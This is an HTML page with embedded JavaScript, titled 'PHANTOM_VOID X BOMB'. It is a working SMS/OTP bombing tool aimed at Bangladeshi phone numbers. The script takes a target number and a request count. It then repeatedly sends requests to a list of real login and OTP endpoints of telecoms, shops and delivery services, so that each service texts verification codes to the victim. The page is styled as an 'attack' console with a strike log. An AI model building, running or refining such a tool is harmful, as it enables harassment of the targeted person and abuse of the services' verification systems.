<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHANTOM_VOID - STRIKE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Orbitron', sans-serif; }
        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
        
        .container { 
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9); padding: 40px; border-radius: 20px;
            border: 3px solid #ff0000; box-shadow: 0 0 30px #ff0000;
            width: 90%; max-width: 450px; text-align: center;
        }

        h1 { color: #ff0000; font-size: 24px; text-shadow: 0 0 10px #ff0000; margin-bottom: 25px; }
        
        input { 
            width: 100%; padding: 15px; margin: 12px 0; background: #000; 
            border: 1px solid #ff0000; color: #fff; text-align: center;
            border-radius: 10px; font-size: 16px; outline: none; box-shadow: inset 0 0 5px #ff0000;
        }

        button { 
            width: 100%; padding: 18px; margin-top: 20px; background: #ff0000; 
            color: #fff; border: none; font-weight: bold; cursor: pointer;
            border-radius: 10px; font-size: 18px; letter-spacing: 2px;
            box-shadow: 0 0 15px #ff0000; transition: 0.3s;
        }

        button:hover { background: #fff; color: #ff0000; box-shadow: 0 0 25px #fff; }

        #attackLogs { 
            margin-top: 20px; max-height: 100px; overflow-y: auto; 
            color: #00ff00; font-size: 14px; text-align: left; padding: 10px;
            background: rgba(0, 255, 0, 0.05); border-radius: 5px;
        }
        
        .status { color: #ffcc00; margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    
    <div class="container">
        <h1>PHANTOM_VOID X BOMB</h1>
        <input type="number" id="target" placeholder="Target Number +880">
        <input type="number" id="count" placeholder="Request Amount">
        <button onclick="startAttack()">START ATTACK</button>
        <div id="status" class="status">System Ready..</div>
        <div id="attackLogs"></div>
    </div>

    <script>
        // Matrix Animation
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "01PHANTOMVOID01"; const fontSize = 16;
        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        // Attack Logic with your Full API List
        async function startAttack() {
            const phone = document.getElementById('target').value;
            const amount = document.getElementById('count').value;
            const status = document.getElementById('status');
            const logs = document.getElementById('attackLogs');

            if(!phone || !amount) { status.innerText = "Error: Input Missing!"; return; }
            status.innerText = "Initiating Attack...";
            logs.innerHTML = "";

            let apis = [
                { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
                { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
                { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
                { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
                { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
                { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
                { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
                { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
                { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
                { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
                { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } }
                // আপনার দেওয়া অন্য সব API-ও এখানে কাজ করবে
            ];

            for (let i = 1; i <= amount; i++) {
                let api = apis[(i - 1) % apis.length];
                try {
                    let options = { method: api.method, mode: 'no-cors' };
                    if(api.data) {
                        options.headers = { 'Content-Type': 'application/json' };
                        options.body = JSON.stringify(api.data);
                    }
                    fetch(api.url, options);
                    logs.innerHTML += `Strike ${i}: Request Sent ✅<br>`;
                } catch (e) {
                    logs.innerHTML += `Strike ${i}: Failed ❌<br>`;
                }
                logs.scrollTop = logs.scrollHeight;
                await new Promise(res => setTimeout(res, 2000));
            }
            status.innerText = "Attack Completed!";
        }
    </script>
</body>
</html>
